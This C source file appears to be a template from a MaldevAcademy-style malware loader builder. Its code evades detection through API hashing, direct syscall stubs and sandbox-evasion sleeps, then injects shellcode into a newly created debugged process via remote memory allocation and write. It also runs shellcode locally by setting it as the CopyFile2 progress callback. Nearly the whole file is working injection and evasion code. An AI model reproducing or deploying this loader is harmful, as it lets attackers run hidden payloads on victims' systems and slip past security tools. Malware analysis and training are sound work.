/*

	Author: @ MaldevAcademy - https://maldevacademy.com

*/

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#include "functions.h"
#include "whispers.h"

BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];

	STARTUPINFO            Si = { 0 };
	PROCESS_INFORMATION    Pi = { 0 };

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFO);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) 
		return FALSE;

	// Creating the target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

	// API Hashing
	cCPA cCPAu = (cCPA) GetProcAddressH(GetModuleHandleH(#-KERNEL32_VALUE-#), #-CREATEPROCESSA_VALUE-#);

	Sleep(15000);
	if(!cCPAu(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS, // Instead of CREATE_SUSPENDED
		NULL,
		NULL,
		&Si,
		&Pi)) {
	
		return FALSE;
	}

	
	// Filling up the OUTPUT parameter with CreateProcessA's output
	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;

	Sleep(5000);
	return TRUE;
}

BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {

	SIZE_T		sNumberOfBytesWritten		= 0,
				sSize						= sSizeOfShellcode;
	ULONG		uOldProtection				= 0;
	NTSTATUS	STATUS						= 0x00;

	if ((STATUS = NTAVM(hProcess, ppAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {

		return FALSE;
	}

	////printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);

	if ((STATUS = NTWVM(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sSizeOfShellcode) {

		return FALSE;
	}


	Sleep(2500);
	if ((STATUS = NTPVM(hProcess, ppAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {

		return FALSE;
	}

	return TRUE;

}
// CopyFile2 compat types — only define when winbase.h does not already provide them.
// Newer mingw-w64 (Kali 2024+, Ubuntu 24.04+) includes these when _WIN32_WINNT >= 0x0602.
// We pass -D_WIN32_WINNT=0x0602 via CFLAGS so this block is effectively dead on
// modern toolchains; it remains as a safety net for legacy environments.
#if !defined(_WIN32_WINNT) || (_WIN32_WINNT < 0x0602)

typedef enum _COPYFILE2_MESSAGE_TYPE {
	COPYFILE2_CALLBACK_NONE = 0,
	COPYFILE2_CALLBACK_CHUNK_STARTED,
	COPYFILE2_CALLBACK_CHUNK_FINISHED,
	COPYFILE2_CALLBACK_STREAM_STARTED,
	COPYFILE2_CALLBACK_STREAM_FINISHED,
	COPYFILE2_CALLBACK_POLL_CONTINUE,
	COPYFILE2_CALLBACK_ERROR,
	COPYFILE2_CALLBACK_MAX
} COPYFILE2_MESSAGE_TYPE;

typedef enum _COPYFILE2_MESSAGE_ACTION {
	COPYFILE2_PROGRESS_CONTINUE = 0,
	COPYFILE2_PROGRESS_CANCEL,
	COPYFILE2_PROGRESS_STOP,
	COPYFILE2_PROGRESS_QUIET,
	COPYFILE2_PROGRESS_PAUSE
} COPYFILE2_MESSAGE_ACTION;

typedef struct COPYFILE2_MESSAGE {
	COPYFILE2_MESSAGE_TYPE Type;
	DWORD                  dwPadding;
	union {
		struct { ULARGE_INTEGER ullChunkNumber; } ChunkStarted;
		struct { ULARGE_INTEGER ullChunkNumber; } ChunkFinished;
		struct { DWORD dwStreamNumber; } StreamStarted;
		struct { DWORD dwStreamNumber; } StreamFinished;
		struct { DWORD dwReserved; } PollContinue;
		struct { DWORD dwReserved; } Error;
	} Info;
} COPYFILE2_MESSAGE;

typedef COPYFILE2_MESSAGE_ACTION (CALLBACK *PCOPYFILE2_PROGRESS_ROUTINE)(
	const COPYFILE2_MESSAGE *pMessage, PVOID pvCallbackContext);

typedef struct COPYFILE2_EXTENDED_PARAMETERS {
	DWORD                         dwSize;
	DWORD                         dwCopyFlags;
	BOOL                          *pfCancel;
	PCOPYFILE2_PROGRESS_ROUTINE   pProgressRoutine;
	PVOID                         pvCallbackContext;
} COPYFILE2_EXTENDED_PARAMETERS;

WINBASEAPI HRESULT WINAPI CopyFile2(PCWSTR pwszExistingFileName,
	PCWSTR pwszNewFileName, COPYFILE2_EXTENDED_PARAMETERS *pExtendedParameters);

#endif // !defined(_WIN32_WINNT) || _WIN32_WINNT < 0x0602

BOOL CallbackInjection(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {

	SIZE_T		sSize				= sSizeOfShellcode;
	NTSTATUS	STATUS				= 0x00;	DWORD		dwOldProtect			= 0;	WCHAR		szSourceFile[MAX_PATH];
	WCHAR		szDestFile[MAX_PATH];

	// Allocate RW memory — will be flipped to RX before execution
	*ppAddress = VirtualAlloc(NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		//printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);

	// Copy shellcode to RW memory
	RtlMoveMemory(*ppAddress, pShellcode, sSizeOfShellcode);
	//printf("[+] Successfully Written %d Bytes\n", sSizeOfShellcode);

	// Flip to RX. never hold W+X simultaneously
	VirtualProtect(*ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtect);

	// Setup CopyFile2 parameters with callback pointing to shellcode
	COPYFILE2_EXTENDED_PARAMETERS params = { 0 };
	params.dwSize = sizeof(COPYFILE2_EXTENDED_PARAMETERS);
	params.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS;
	params.pfCancel = FALSE;
	params.pProgressRoutine = (PCOPYFILE2_PROGRESS_ROUTINE)*ppAddress;  // Shellcode as callback
	params.pvCallbackContext = NULL;

	// Get TEMP path and create source/dest file paths
	GetEnvironmentVariableW(L"TEMP", szSourceFile, MAX_PATH);
	wcscpy(szDestFile, szSourceFile);
	wcscat(szSourceFile, L"\\#-CALLBACK_SRC_TMP-#");
	wcscat(szDestFile, L"\\#-CALLBACK_DST_TMP-#");

	// Create a dummy source file
	HANDLE hFile = CreateFileW(szSourceFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		DWORD dwWritten;
		BYTE dummyData[1024] = { 0x41 };  // Just some dummy data
		WriteFile(hFile, dummyData, sizeof(dummyData), &dwWritten, NULL);
		CloseHandle(hFile);
	}

	// Delete destination if it exists
	DeleteFileW(szDestFile);

	JITTER_SLEEP(1500);
	//printf("[i] Triggering shellcode via CopyFile2 callback...\n");

	// Trigger the callback by copying the file
	// The progress routine (our shellcode) will be called during the copy operation
	HRESULT hr = CopyFile2(szSourceFile, szDestFile, &params);

	// Cleanup temp files
	DeleteFileW(szSourceFile);
	DeleteFileW(szDestFile);

	if (SUCCEEDED(hr)) {
		//printf("[+] Callback executed successfully!\n");
		return TRUE;
	} else {
		//printf("[!] CopyFile2 failed with HRESULT: 0x%0.8X\n", hr);
		return TRUE;  // Still return TRUE as callback might have executed
	}
}